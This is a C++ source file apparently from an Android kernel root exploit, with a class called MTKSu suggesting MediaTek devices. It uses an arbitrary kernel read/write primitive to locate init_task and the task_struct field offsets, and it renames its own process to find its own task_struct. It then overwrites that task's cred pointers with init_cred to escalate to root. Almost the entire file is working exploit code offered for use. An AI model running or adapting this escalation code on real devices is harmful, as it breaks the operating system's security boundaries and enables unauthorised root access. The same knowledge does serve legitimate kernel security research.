#include <string.h>
#include <sys/prctl.h>
#include <time.h>
#include <unistd.h>

#include <iostream>
#include <memory>

#include "disasm.hpp"
#include "log.hpp"
#include "task.hpp"
#include "utils.hpp"

// The init_task's command name. This is from include/linux/init_task.h.
#define INIT_TASK_COMM "swapper"

// The max task command name size. This is from include/linux/sched.h.
#define TASK_COMM_LEN 16

// POD containing kernel addresses and offsets of interest. If an address is not resolved, it's set to zero.
typedef struct kernel_addrs {
	// Task struct address of the current process.
	uint64_t task_struct;

	// The address of the init_task, a.k.a. swapper process. This process is the first processes created, which is
	// why it's assigned PID zero. The kernel uses it as a default process to swap to when no other processes
	// are waiting execution. During execution, the init_task process just a busy loops unit another process
	// starts. This usually only occurs during boot time.
	//
	// The init_task is used to:
	// 1) Find a given process' task_task by traversing the tasks field
	// 2) Get a pointer to a cred struct of a root process (its own cred struct because it executes as root)
	uint64_t init_task;

	// Address of the init_task's cred struct, which contains root credentials. This value will be used to
	// overwrite the creds struct of the process to escalate, effectively giving it root credentials. This is a
	// safe cred struct to use because the init_task never exits.
	uint64_t init_cred;

	// The offset of the comm field within a task_struct, which varies depending on kernel build. This is used to:
	// 1) Identify the task_struct of the process to escalate
	// 2) Find the cred pointers that immediately precede this field
	uint32_t comm_offset;

	// The offset of the tasks field within a task_struct, which varies depending on kernel build. The tasks field
	// is a list_head struct which means it's actually pointing to the next task since it's the first field in the
	// struct. The previous task is one kernel pointer size away from the next offset.
	//
	// The next offset is used to iterate from one task struct (e.g. the init_task struct) to a task struct of
	// interest (usually the one that will be escalated).
	uint32_t next_offset;

	// The offset of the cred field within a task_struct.
	uint32_t cred_offset;

} kernel_addrs_t;

/**
 * Generates a random process name.
 *
 * @return a random 15 character process name
 */
static inline std::string _generate_random_process_name()
{
	// The process can only be 16 bytes long, including the null terminator.
	const uint32_t max_proc_name_len = TASK_COMM_LEN - 1;
	// Offset of the first printable character in the ASCII table.
	const uint32_t ascii_start = 32;
	// The number of contiguous printable ASCII character in the ASCII table.
	const uint32_t ascii_char_range = 94;
	const uint32_t num_chars_to_append = 1;
	std::string rand_proc_name{};

	srand(time(NULL));
	for (uint32_t itr = 0; itr < max_proc_name_len; itr++) {
		char rand_char = (char)((rand() % ascii_char_range) + ascii_start);
		rand_proc_name.append(num_chars_to_append, rand_char);
	}

	log_info("Renaming the current process to %s", rand_proc_name.c_str());

	return rand_proc_name;
}

/**
 * Determines if a given address is pointing to a task_struct.
 *
 * @param addr: The possible task_struct address.
 * @return true if addr is pointing to a task_struct, otherwise false
 */
static bool _is_task_struct(MTKSu& kern_rw, uint32_t addr, uint64_t comm_offset)
{
	auto task_struct_max_size = 0x800;
	auto task_struct_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(addr, task_struct_max_size, task_struct_bytes);
	if (!success) {
		log_error("Could not read task_struct bytes");
		return false;
	}

	// Must have a C string at offset
	char* comm = (char*)(((uint8_t*)task_struct_bytes->data()) + comm_offset);
	size_t comm_len = strlen(comm);
	if (comm_len < 1 || comm_len > 15) {
		return false;
	}

	// The kernel stack pointer must be a kernel pointer
	const uint32_t kernel_stack_offset = get_kern_ptr_size();
	uint64_t kernel_stack = (uint64_t) * (uint32_t*)(((uint8_t*)task_struct_bytes->data()) + kernel_stack_offset);
	if (!is_kernel_address(kernel_stack)) {
		log_error("Not a task_struct because the kernel stack is not a kernel pointer: %" PRIx64, kernel_stack);
		return false;
	}

	return true;
}

/**
 * Finds the offset of the comm (command name) field in the task_struct.
 *
 * @param task_struct: The bytes of a task_struct struct.
 * @param task_struct_size: The number of bytes to search through in the task_struct.
 * @param command: The expected command name.
 * @param comm_offset: The offset of the comm field in the task_struct.
 * @return true if the comm field was found, otherwise false
 */
static bool _find_comm_offset_in_task_struct(uint8_t* task_struct,
                                             uint32_t task_struct_size,
                                             const char* command_name,
                                             uint32_t& comm_offset)
{
	const int str_eq = 0;

	// Increment by 4 because the comm field will be aligned
	uint32_t kern_ptr_size = get_kern_ptr_size();
	for (uint32_t str_itr = 0; str_itr < task_struct_size; str_itr += kern_ptr_size) {
		char* str_val = (char*)(task_struct + str_itr);
		if (strncmp(str_val, command_name, TASK_COMM_LEN) == str_eq) {
			comm_offset = str_itr;
			return true;
		}
	}

	return false;
}

/**
 * Scans the show_state_filter function for a pointer to the init_task.
 *
 * @return true if found init_task, otherwise false
 */
static bool _find_init_task_via_show_state_filter(MTKSu& kern_rw,
                                                  std::map<std::string, uint64_t>& symbol_table,
                                                  kernel_addrs& addrs_out)
{
	const std::string show_state_filter_name = "Tshow_state_filter";
	auto show_state_filter_addr = 0ull;
	try {
		show_state_filter_addr = symbol_table.at(show_state_filter_name);
	} catch (std::out_of_range e) {
		log_error("Could not find show state filter function");
		return false;
	}
	log_info("Found show_state_filter at 0x%" PRIx64, show_state_filter_addr);

	// This may need to be adjusted in the future
	const uint32_t show_state_filter_max_bytes = 0x400;
	auto show_state_filter_func_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(show_state_filter_addr, show_state_filter_max_bytes, show_state_filter_func_bytes);
	if (!success) {
		log_error("Could not read show state filter function");
		return false;
	}

	// Most ARM instructions start with 0xeXXXXXXX. This will be used to filter out the instructions so we can
	// find a pointer value.
	auto arm_instr_min_val = 0xe0000000ul; // 32-bit kernels only
	auto task_struct_bytes = std::make_unique<std::vector<uint8_t>>();
	for (uint32_t scan_itr = 0; scan_itr < show_state_filter_max_bytes; scan_itr += 4) {
		uint32_t scan_value = 0;
		auto success = get_value<uint32_t>(*show_state_filter_func_bytes.get(), scan_itr, scan_value);
		if (!success) {
			log_error("Could not get value from show state filter function");
			return false;
		}
		if (scan_value > arm_instr_min_val) {
			continue;
		}
		if (!is_kernel_address(scan_value)) {
			continue;
		}

		log_info("Found possible init_task pointer 0x%" PRIx64, (uint64_t)scan_value);

		const uint64_t task_struct_to_comm_max_size = 0x800;
		task_struct_bytes->clear();
		success = kern_rw.read(scan_value, task_struct_to_comm_max_size, task_struct_bytes);
		if (!success) {
			log_error("Could not read the task_struct bytes");
			return false;
		}

		success = _find_comm_offset_in_task_struct(task_struct_bytes->data(), task_struct_to_comm_max_size,
		                                           INIT_TASK_COMM "/0", addrs_out.comm_offset);
		if (!success) {
			log_info("Could not find task_struct->comm. Skipping 0x%" PRIx64, (uint64_t)scan_value);
			continue;
		}
		log_info("Found the task_struct->comm offset at 0x%" PRIx32, addrs_out.comm_offset);

		// Calculating the init_cred address. The creds fields are immediately before the comm field. This
		// is defined in kern/cred.c.
		success = get_kern_ptr(*task_struct_bytes.get(), addrs_out.comm_offset - get_kern_ptr_size(),
		                       addrs_out.init_cred);
		if (!success) {
			log_info("Could not get the task_struct pointer value");
			return false;
		}
		log_info("Found the init_cred addr at 0x%" PRIx64, addrs_out.init_cred);
		addrs_out.init_task = scan_value;
		return true;
	}

	return false;
}

static bool _find_next_task_offset(MTKSu& kern_rw,
                                   std::map<std::string, uint64_t>& symbol_table,
                                   uint64_t init_task_addr,
                                   uint32_t comm_offset,
                                   uint32_t& next_task_offset)
{
	const std::string show_state_filter_name = "Tshow_state_filter";
	auto show_state_filter_addr = 0ull;
	try {
		show_state_filter_addr = symbol_table.at(show_state_filter_name);
	} catch (std::out_of_range e) {
		log_error("Could not find show state filter function");
		return false;
	}

	// This may need to be adjusted in the future
	const uint32_t show_state_filter_max_bytes = 0x400;
	auto show_state_filter_func_bytes = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(show_state_filter_addr, show_state_filter_max_bytes, show_state_filter_func_bytes);
	if (!success) {
		log_error("Could not read show state filter function");
		return false;
	}

	auto instr = DataProcessingInstructionArm32{};
	auto next_task_ptr_bytes = std::make_unique<std::vector<uint8_t>>();
	for (uint32_t instr_itr = 0; instr_itr < show_state_filter_max_bytes; instr_itr += 4) {
		uint32_t instruction_value = 0;
		auto success = get_value<uint32_t>(*show_state_filter_func_bytes.get(), instr_itr, instruction_value);
		if (!success) {
			log_error("Could not get value from show state filter function");
			return false;
		}

		instr.set_instruction(instruction_value);
		auto op_code = instr.get_op_code();
		// There may be other op codes used in the future
		if (!(op_code == DataProcInstrOpCodeArm32::ADD || op_code == DataProcInstrOpCodeArm32::SUB ||
		      op_code == DataProcInstrOpCodeArm32::RSB)) {
			continue;
		}

		auto instr_immediate_offset = instr.get_immediate_value();
		log_info("Found immediate %x", instr_immediate_offset);

		// These may need to be adjusted in the future
		auto next_offset_min = 0x200;
		auto next_offset_max = 0x380;
		if (instr_immediate_offset < next_offset_min || instr_immediate_offset > next_offset_max) {
			continue;
		}

		// Verify that the value at the offset is a kernel pointer
		next_task_ptr_bytes->clear();
		success =
		    kern_rw.read(init_task_addr + instr_immediate_offset, get_kern_ptr_size(), next_task_ptr_bytes);
		if (!success) {
			log_error("Could not read the next task pointer in the init_task");
			return false;
		}

		auto next_task_addr_ptr = 0ull;
		success = get_kern_ptr(*next_task_ptr_bytes.get(), 0, next_task_addr_ptr);
		if (!success) {
			log_error("Could not get the next task_struct pointer value");
			return false;
		}

		log_info("Value at init_task + immediate = %llx", next_task_addr_ptr);

		next_task_offset = instr_immediate_offset;
		log_info("Found the task_struct->next offset: %x", next_task_offset);
		return true;
	}

	return false;
}

static bool _find_init_task(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table, kernel_addrs& addrs_out)
{
	auto success = _find_init_task_via_show_state_filter(kern_rw, symbol_table, addrs_out);
	if (!success) {
		log_error("Failed to find the init_task via the show_state_filter scanning");
		return false;
	}

	return true;
}

/**
 * Iterate through the task_struct process list until a thread with a given command name is found.
 *
 * @param kern_rw: The kernel read/write used to access kernel memory.
 * @param task_struct_addr: The address of a given task_struct. This must be in the same namespace as the thread
 * we're looking for.
 * @param comm_offset: The offset of the comm field in a task_struct.
 * @param next_task_offset: The offset of the tasks.next field in a task_struct.
 * @param task_struct_out: The task_struct address of the thread with the comm field set to the comm_name parameter.
 * @return true if the task_struct was found, otherwise false
 */
static bool _find_task_by_command_name(
    MTKSu& kern_rw, uint64_t task_struct_addr, uint32_t comm_offset, uint32_t next_task_offset, uint64_t& task_struct_out)
{
	auto rand_proc_name = _generate_random_process_name();
	const unsigned long ignored_param = 0;
	auto ret =
	    prctl(PR_SET_NAME, rand_proc_name.c_str(), ignored_param, ignored_param, ignored_param, ignored_param);
	if (ret == -1) {
		log_error("Failed to set the process name to a random name: %s", strerror(errno));
		return false;
	}

	const uint64_t task_struct_buf_size = 0x800;
	auto task_struct_buf = std::make_unique<std::vector<uint8_t>>();
	uint64_t task_struct_itr = task_struct_addr;
	do {
		task_struct_buf->clear();
		auto success = kern_rw.read(task_struct_itr, task_struct_buf_size, task_struct_buf);
		if (!success) {
			log_error("Failed to read task_struct");
			return false;
		}

		char* comm_name_itr = (char*)(task_struct_buf->data() + comm_offset);
		log_info("%" PRIx64 " found task: %s", task_struct_itr, comm_name_itr);

		if (strcmp(comm_name_itr, rand_proc_name.c_str()) == 0) {
			log_info("Found the task_struct at %" PRIx64, task_struct_itr);
			task_struct_out = task_struct_itr;
			return true;
		}

		// The list_head next field points to the list_head field of the next task_struct. Calculate the
		// original task_struct address by subtracting the list_head offset.
		uint64_t next_task_list_head_addr =
		    (uint64_t) * (uint32_t*)(task_struct_buf->data() + next_task_offset);
		task_struct_itr = next_task_list_head_addr - next_task_offset;
		if (!is_vmalloc_address(task_struct_itr)) {
			log_error("task_struct is not a vmalloc address: %" PRIx64, task_struct_itr);
			return false;
		}

	} while (task_struct_itr != task_struct_addr);

	log_error("Looped through the entire task_struct list without finding the task_struct with the command name %s",
	          rand_proc_name.c_str());
	return false;
}

/**
 * Find the task_struct->tasks offset. These field with be two task_struct next to each other.
 */
static bool _find_task_struct_from_init_task(
    MTKSu& kern_rw, uint64_t init_task_addr, uint32_t comm_offset, uint32_t next_offset, uint64_t& task_struct_out)
{
	// Follow the two pointers, ensuring we don't loop all the way around. On each iteration, check if the
	// task_struct->comm matches the new randomly generated process name. If so, then we have found our
	// task_struct!
	auto success = _find_task_by_command_name(kern_rw, init_task_addr, comm_offset, next_offset, task_struct_out);
	if (!success) {
		log_error("Failed to find the task_struct by command name");
		return false;
	}

	return true;
}

static bool _find_task_struct(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table, kernel_addrs_t& addrs_out)
{
	log_info("Using the init_task method as a last resort to find the current task_struct");
	auto success = _find_init_task(kern_rw, symbol_table, addrs_out);
	if (!success) {
		log_error("Failed to find the init_task");
		return false;
	}

	success = _find_next_task_offset(kern_rw, symbol_table, addrs_out.init_task, addrs_out.comm_offset,
	                                 addrs_out.next_offset);
	if (!success) {
		log_error("Failed to find the init_task->tasks.next offset");
		return false;
	}

	success = _find_task_struct_from_init_task(kern_rw, addrs_out.init_task, addrs_out.comm_offset,
	                                           addrs_out.next_offset, addrs_out.task_struct);
	if (!success) {
		log_error("Found the init_task but could not find the task_struct");
		return false;
	}

	return true;
}

static inline void _log_creds()
{
	uid_t ruid = 0, euid = 0, suid = 0;
	int ret = getresuid(&ruid, &euid, &suid);
	if (ret == -1) {
		log_error("getresuid failed: %s", strerror(errno));
	}
	log_info("ruid: %d euid: %d suid: %d", ruid, euid, suid);
}

bool escalate_creds(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table)
{
	kernel_addrs_t addrs = {0};
	memset(&addrs, 0, sizeof(addrs));

	auto success = _find_task_struct(kern_rw, symbol_table, addrs);
	if (!success) {
		log_error("Failed to find the task_struct");
		return false;
	}
	// The cred field immediately precedes the comm field in the task_struct.
	addrs.cred_offset = addrs.comm_offset - get_kern_ptr_size();

	uint32_t write_buf[2] = {0};
	uint32_t write_buf_size = 8;

	const uint64_t task_struct_buf_size = 0x800;
	auto task_struct_buf = std::make_unique<std::vector<uint8_t>>();

	success = kern_rw.read(addrs.task_struct, task_struct_buf_size, task_struct_buf);
	if (!success) {
		log_error("Failed to read task_struct");
		return false;
	}

	_log_creds();

	uint64_t cred_addr = addrs.task_struct + addrs.cred_offset - get_kern_ptr_size();
	log_info("Overwriting creds at %" PRIx64 " with init_task's creds %" PRIx64, cred_addr, addrs.init_cred);

	write_buf[0] = addrs.init_cred;
	write_buf[1] = addrs.init_cred;
	auto write_buf_vec = std::vector<uint8_t>((uint8_t*)write_buf, ((uint8_t*)write_buf) + 8);
	auto write_buf_unique = std::make_unique<std::vector<uint8_t>>(write_buf_vec);
	success = kern_rw.write(cred_addr, write_buf_unique);
	if (!success) {
		log_error("Failed to overwrite the current thread's creds with init_task's creds");
		return false;
	}

	log_info("Successfully overwrote the current thread's creds with init_task's creds");
	_log_creds();
	task_struct_buf->clear();
	success = kern_rw.read(addrs.task_struct, task_struct_buf_size, task_struct_buf);
	if (!success) {
		log_error("Failed to read task_struct");
		return false;
	}

	return true;
}
